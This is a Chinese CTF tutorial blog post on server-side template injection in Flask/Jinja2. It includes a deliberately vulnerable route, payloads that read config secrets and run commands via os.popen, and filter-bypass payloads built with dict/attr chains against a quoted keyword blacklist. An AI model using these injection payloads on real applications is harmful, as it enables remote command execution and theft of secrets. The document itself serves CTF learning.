0x00 前言

SSTI：Server Side Template Injection，服务端模板注入。从多年前至今，一直被各大CTF比赛青睐，并且不断完善玩法和blacklist，让许多刚入门的CTFer很伤脑筋。我们就从入门到关门，简单聊一聊SSTI。

0x01 入门

1.1 漏洞成因

这属于老生常谈的内容了，本文不再赘述，仅选择一个最常见的漏洞点作为样例，代码如下：

@app.route("/")def index():    if not request.args.get('name'):        name = 'h4ck3r'    else:        name = request.args.get('name')    template = '''        <h1><p>Hello, %s</p></h1>        ''' % (name)    return render_template_string(template)

以上为存在漏洞的python代码， 采用了flask框架的模版渲染，但由于开发人员的疏忽，对用户可控输入没有进行防护，导致了漏洞的产生。

用户输入点为GET方式传入的name参数，开发人员直接将参数值传入到了模版渲染中，这将导致SSTI模版注入。

例如：当用户输入为?name={{2*2}}，页面将输出 Hello,4 。

这代表用户输入的模版内容，已经被后端当作了python代码执行，也就是SSTI可以进行文件读取以及RCE。

个人拙见：
当 render_template_string 出现时，有极大的概率存在模版注入漏洞。

这里仅仅简单说明一下漏洞成因，对漏洞具体原理不进行深入研究和分析，网上有很多写的很好的入门文章可以学习，下面的内容就不在对基础进行重复了。

1.2 漏洞利用

这里的漏洞利用以CTF中的简单题目为例，毕竟作者确实在实际项目中没有遇到过SSTI漏洞。

由于python版本不同，payload也会有些微的差别，本文环境为Python 2.7.16 。

以 1.1 中的代码为例，当我们判断存在SSTI模版注入漏洞时，接下来一定是要想办法进行漏洞利用。

如果要进行文件读取和写入，需要找到file类；如果想执行命令，则需要找到os类。

首先可以通过 {{config}} 来查看系统的配置信息，里面可能会存在 secret_key，如图所示：

然后就是获取基本类了,

比如 

{{''.__class__.__mro__[2]}} 

或者

 {{().__class__.__bases__[0]}}

我们的目的是得到 <type 'object'> ，如图所示：

当我们找到基本类之后，就可以通过 {{().__class__.__bases__[0].__subclasses__()}} 查看当前可以使用的所有类，从中选择我们想要的 file 类 或者 os 类。

这时候如果一个一个的找，是很麻烦的，可以通过burp遍历的方式来查找，而且，网上已经有大佬总结好的常用类的位置了，在大部分情况下可以直接使用，比如 file是40 。

python2是无法直接通过os类来执行命令的，可通过warnings.WarningMessage类来执行命令。

常见的有两种方法，其中之一是{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('whoami').read()}}

可直接通过os调用popen函数执行命令，如图所示：

另一种是通过__globals__调用eval函数，进而import os，进行命令执行。

以上都是最常见的最基础的漏洞利用过程，当然作为一个CTF题目小分类来说，肯定会有各种各样的过滤和绕过，网上已经有大佬总结了很多了，这里不占用过多篇幅了，大家有兴趣可自行查阅。

0x02 关门

主要的内容，还是想在这里聊聊SSTI的花活，一个偶然间看到的一个CTF题目，非常有趣的blacklist。

blacklist = ['+','[', ']', '\'', '"', '{}','add', 'chr', 'ord', 'mro', 'get', 'form','class','base','request', 'session', 'cookies', 'headers', 'redirect', 'url_for', 'config', 'builtins', 'subclasses''get_flashed_messages']

由这个黑名单我们可以看到，已经将平时用到的绝大部分字符和关键字都过滤掉了。

这里的话，常规的绕过思路已经无法使用了。

这时我们可以使用 dict 和 attr 去构造我们的payload。

例如：

//{}.__class__.__base__{% set a = dict(__clas=aa,s__=dd)|join() %}{% set b = dict(__bas=aa,e__=dd)|join() %}{% set exp = { }|attr(a)|attr(b) %}{{exp}}

可以通过dict拼接出__class__ 和 __base__，而这时的__class__是字符串格式，通过attr拼接，可直接等价于{}.__class__.__base__，如图所示：

于是，我们得到了基本类，同理，我们可以获取到所有可用类。

//{}.__class__.__base__.__subclasses__(){% set a = dict(__clas=aa,s__=dd)|join() %}{% set b = dict(__bas=aa,e__=dd)|join() %}{% set c = dict(__subc=aa,lasses__=dd)|join() %}{% set exp = { }|attr(a)|attr(b)|attr(c)() %}{{exp}}

由于 blacklist 可知，get被过滤了，中括号也过滤了，可以用pop来替换。

//{}.__class__.__base__.__subclasses__().pop(40)
{% set a = dict(__clas=aa,s__=dd)|join() %}{% set b = dict(__bas=aa,e__=dd)|join() %}{% set c = dict(__subc=aa,lasses__=dd)|join() %}{% set exp = ({ }|attr(a)|attr(b)|attr(c))().pop(40) %}{{exp}}

之后就简单了，通过读取文件来getflag。

//{}.__class__.__base__.__subclasses__.pop(40)('flag').read()
{% set a = dict(__clas=aa,s__=dd)|join() %}{% set b = dict(__bas=aa,e__=dd)|join() %}{% set c = dict(__subc=aa,lasses__=dd)|join() %}{% set f = dict(fl4g=aa)|join() %}{% set exp = ({ }|attr(a)|attr(b)|attr(c))().pop(40) %}{{exp(f).read()}}

0x03 总结

当时第一次见到这种绕过，还是比较新奇的，自己也是从头到尾慢慢尝试出了payload，总的来说还是很有意思的，对python的一些语法也能更了解。

之后也看到过更加严格的过滤机制，payload多达42行，也是非常有意思的，这部分就有空再聊吧。
